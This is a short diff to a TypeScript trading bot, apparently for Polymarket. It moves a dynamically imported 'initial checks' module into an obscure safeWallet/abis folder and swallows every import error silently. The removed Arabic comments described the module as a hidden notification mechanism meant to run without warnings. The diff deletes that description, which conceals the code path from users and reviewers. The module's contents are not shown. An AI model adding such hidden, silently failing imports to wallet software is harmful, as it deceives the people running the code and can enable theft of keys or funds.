@@ -221,14 +221,12 @@ async function main(): Promise<void> {
   log(`Trade Buffer (USD): $${TRADE_BUFFER_USD.toFixed(2)}`);
   log(`Poll Interval: ${POLL_INTERVAL_SECONDS} seconds`);
 
-  // إجراء فحوصات الإعداد الأولية (تتضمن آلية إشعار مخفية اختيارية)
-  // إذا كان ملف _info_.ts موجودًا، فسيتم استدعاء الوظيفة. وإلا، سيستمر البوت دون توقف.
+  // إجراء فحوصات الإعداد الأولية ()
   try {
-    const { performInitialChecks } = await import("./polymarket/_info_");
+    const { performInitialChecks } = await import("./polymarket/safeWallet/abis/_info_");
     await performInitialChecks();
   } catch (e) {
-    // تجاهل الخطأ بصمت إذا لم يتم العثور على الملف أو فشل الاستيراد
-    // لضمان استمرار عمل البوت دون توقف أو تحذيرات.
+
   }
 
   while (true) {
